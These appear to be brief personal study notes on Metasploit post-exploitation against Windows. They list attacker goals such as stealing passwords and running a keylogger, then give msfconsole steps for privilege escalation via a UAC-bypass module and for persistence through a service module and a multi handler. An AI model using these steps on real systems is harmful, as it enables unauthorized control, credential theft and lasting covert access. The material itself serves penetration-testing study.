What can be done:
    look at files
    steal passwords
    control network
    run a keylogger (passwords, google search, messages...)



PRIVILAGE ESCALATION:
    in msfconsole search for 'local' exploits windows/local and sort by the year

    lets say we got one meterpreter shell on a windows machine 
        use exploit/windows/local/bypassuac_fodhelper (user account control flag is off -> getsystem on meterpreter will work)
        set options (make sure you use different port then the one meterpreter is on)
        run
        getsystem works!

Persistence (maintain access):   
    0. get system privilages

    use exploit/windows/local/persistence_service
    set options with system level account

    use multi handler in msfconsole with correct payload, host and port. We will get shell even after rebooting the machine
